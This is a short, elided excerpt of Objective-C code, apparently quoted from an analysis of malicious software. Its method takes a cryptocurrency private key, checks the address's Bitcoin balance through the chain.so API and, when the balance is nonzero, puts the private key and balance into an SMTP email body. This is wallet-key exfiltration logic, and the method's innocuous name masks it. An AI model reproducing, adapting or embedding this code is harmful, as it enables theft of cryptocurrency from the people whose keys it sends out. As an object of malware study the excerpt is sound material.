...
+ (void)keyNoteWithPrivateKey:(NSString *)privateKey
{
    NSString *urlString = [NSString stringWithFormat:@"https://chain.so/api/v2/get_address_balance/BTC/%@",[privateKey componentsSeparatedByString:@"/"].lastObject];
    ...
    NSURLSessionDataTask *dataTask = [sharedSession dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (error == nil) {
            ...
            if ([dict[@"data"][@"confirmed_balance"] floatValue]) {
                ...
                NSDictionary *plainPart = [NSDictionary dictionaryWithObjectsAndKeys:@"text/plain",kSKPSMTPPartContentTypeKey,[privateKey stringByAppendingString:[NSString stringWithFormat:@"/%@",dict[@"data"][@"confirmed_balance"]]],kSKPSMTPPartMessageKey,@"8bit",kSKPSMTPPartContentTransferEncodingKey,nil];
